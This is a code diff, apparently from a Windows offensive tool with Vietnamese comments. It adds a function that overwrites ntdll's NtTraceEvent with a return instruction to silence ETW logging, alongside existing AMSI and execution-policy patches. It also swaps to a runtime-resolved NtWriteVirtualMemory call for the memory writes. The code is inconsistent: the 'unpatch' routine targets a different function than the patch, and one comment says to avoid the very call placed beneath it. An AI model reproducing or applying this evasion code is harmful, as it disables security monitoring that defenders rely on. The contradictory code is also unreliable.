@@ -69,6 +69,33 @@ BOOL PatchAmsiScanBuffer()
     );
 }
 
+
+BOOL PatchEtwRet(CLR &clr)
+{
+    // 0xC3 = ret - hàm return ngay, không ghi event nào
+    BYTE patch[1] = { 0xC3 };
+    return PatchUnmanagedFunction(
+        L"ntdll.dll",
+        "NtTraceEvent",
+        patch,
+        sizeof(patch),
+        0
+    );
+}
+
+BOOL UnpatchEtwRet(CLR& clr)
+{
+    // 0xC3 = ret - hàm return ngay, không ghi event nào
+    BYTE patch[1] = { 0x4C };
+    return PatchUnmanagedFunction(
+        L"ntdll.dll",
+        "EtwEventWriteTransfer",
+        patch,
+        sizeof(patch),
+        0
+    );
+}
+
 //
 // PowerShell uses the method 'GetSystemLockdownPolicy' (SystemPolicy) to get the
 // value of the execution policy enforced on the system. By patching this method
@@ -226,9 +253,12 @@ BOOL PatchProcedure(LPVOID pTargetAddress, LPBYTE pSourceBuffer, DWORD dwSourceB
             goto exit;
         }
 
-
+        using FnNtWriteVirtualMemory = NTSTATUS(NTAPI*)(
+            HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+        auto NtWriteVirtualMemory = (FnNtWriteVirtualMemory)GetProcAddress(
+            GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
         // Avoid using WriteProcessMemory / NtWriteVirtualMemory
-        bSuccess = WriteProcessMemory(
+        bSuccess = NtWriteVirtualMemory(
             GetCurrentProcess(),
             pTargetAddress,
             pSourceBuffer,
